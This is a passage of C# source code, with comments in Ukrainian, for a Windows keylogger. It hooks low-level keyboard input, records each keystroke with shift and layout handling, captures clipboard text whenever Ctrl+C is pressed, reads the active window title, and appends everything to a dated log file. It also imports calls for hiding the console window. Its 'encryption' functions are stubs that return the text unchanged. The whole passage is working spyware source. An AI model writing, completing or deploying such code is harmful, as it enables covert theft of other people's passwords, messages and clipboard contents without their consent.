                                Writer(EncryptL("", "Key"));
                                break;
                            case "RWin":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "Apps":
                                Writer(EncryptL("", "Key"));
                                break;
                            case "1":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("!", "Key"));
                                else Writer(EncryptL("1", "Key"));
                                break;
                            case "2":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("@", "Key"));
                                else Writer(EncryptL("2", "Key"));
                                break;
                            case "3":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("№", "Key"));
                                else Writer(EncryptL("3", "Key"));
                                break;
                            case "4":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL(";", "Key"));
                                else Writer(EncryptL("4", "Key"));
                                break;
                            case "5":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("%", "Key"));
                                else Writer(EncryptL("5", "Key"));
                                break;
                            case "6":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL(":", "Key"));
                                else Writer(EncryptL("6", "Key"));
                                break;
                            case "7":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("?", "Key"));
                                else Writer(EncryptL("7", "Key"));
                                break;
                            case "8":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("*", "Key"));
                                else Writer(EncryptL("8", "Key"));
                                break;
                            case "9":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("(", "Key"));
                                else Writer(EncryptL("9", "Key"));
                                break;
                            case "0":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL(")", "Key"));
                                else Writer(EncryptL("0", "Key"));
                                break;
                            case "OemMinus":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("_", "Key"));
                                else Writer(EncryptL("-", "Key"));
                                break;
                            case "Oemplus":
                                if (Keys.Shift == Control.ModifierKeys)
                                    Writer(EncryptL("+", "Key"));
                                else Writer(EncryptL("=", "Key"));
                                break;
                            default:
                                Writer(EncryptL(" "+original, "Key"));
                                break;
                        }

                    } //російська
                }
                
                //  CTRL+C (копіювання в буфер)
                if (Keys.C == (Keys)vkCode && Keys.Control == Control.ModifierKeys)
                {
                    string htmlData1 = GetBuff();                                                   // отримуємо буфер
                    WriterLine(Encrypt("\n Буфер:  \n" + htmlData1 + "\n", " "));                  // записуємо в буфер
                }
                else if (Keys.Control == Control.ModifierKeys && Keys.Y == (Keys)vkCode)
                {
                    String s = DateTime.Now.ToString("yyyy.MM.dd");
                    Process.Start(s+".dat");
                    Environment.Exit(0);
                }

            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }


        public static string GetBuff()
        {
            string htmlData = Clipboard.GetText(TextDataFormat.Text);
            return htmlData;
        }

        // Запис у файл

        public static void Writer(string inputstring)
        {
            String s = DateTime.Now.ToString("yyyy.MM.dd");
            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\" + s + ".dat", true);
            sw.Write(inputstring);
            sw.Flush();
            sw.Close();
        }
        public static void WriterLine(string inputstring)
        {
            String s = DateTime.Now.ToString("yyyy.MM.dd");
            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\" + s +".dat", true);
            sw.WriteLine(Environment.NewLine + inputstring);
            sw.Flush();
            sw.Close();
        }

        public static string Encrypt(string plainText, string password, string salt = "Key", string hashAlgorithm = "SHA1", int passwordIterations = 2, string initialVector = "OFRna73m*aze01xY", int keySize = 256)
        {
            if (string.IsNullOrEmpty(plainText))
                return "";
            else
                return plainText; 
        }
        public static string EncryptL(string plainText, string password, string salt = "Key", string hashAlgorithm = "SHA1", int passwordIterations = 2, string initialVector = "OFRna73m*aze01xY", int keySize = 256)
        {
            if (string.IsNullOrEmpty(plainText))
                return "";
            else
                return plainText.ToLower();
        }



        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString(); 
            }
            return null;
        }


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        internal static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        const int SW_HIDE = 0;

 

    //------------------------------отримуємо розкладку клавіатури-------------------------------------------------//

    [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowThreadProcessId(
            [In] IntPtr hWnd,
            [Out, Optional] IntPtr lpdwProcessId
            );

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern ushort GetKeyboardLayout(
            [In] int idThread
            );


        static ushort GetKeyboardLayout()
        {
            return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
        }


    }
}
